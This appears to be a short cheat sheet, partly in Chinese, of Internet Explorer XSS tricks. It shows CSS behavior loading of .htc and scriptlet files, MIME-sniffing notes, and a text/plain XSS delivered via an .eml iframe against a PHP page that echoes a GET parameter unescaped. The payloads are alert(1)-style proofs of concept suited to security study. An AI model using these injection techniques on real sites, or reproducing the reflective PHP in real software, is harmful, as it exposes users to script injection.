### Browser tricks - IE

#### XSS In CSS(IE11+Behaviors)

##### .htc

htc.html

    <meta http-equiv="X-UA-Compatible" content="IE=9">
    <input style="behavior: url(xss.htc)">


xss.htc

    <script>alert(1)</script>


> 加载的MIME类型必须为**text/x-component**, Compat Mode必须为**IE=9** 


##### .sct
sct.html

    <meta http-equiv="X-UA-Compatible" content="IE=10">
    <input style="behavior: url(xss.txt)">

xss.txt

    <scriptlet>
        <implements type="behavior"/>
        <script>alert(1)</script>
    </scriptlet>


> 可以利用IE的类型嗅探(MIME sniffing)，类型可以为
- text/html
- text/plain
- image/*
- video/mpeg
- video/avi

##### XSS In Text/Plain

plain.php

```
<?php
header("Content-Type: text/plain");
echo "Hello: ".$_GET["name"];
?>

```


plain.eml



```
TESTEML
Content-Type: text/html
Content-Transfer-Encoding: quoted-printable

=3Ciframe=20src=3D=27plain.php=3Fname=3D=3CHTML=3E=3Ch1=3Eit=20works=3C=2Fh1=3E=27=3E=3C=2Fiframe=3E

```

    
    
    
    
###### Reference :  https://jankopecky.net/index.php/2017/04/18/0day-textplain-considered-harmful/
###### Reference :  https://blog.innerht.ml/cascading-style-scripting/
    
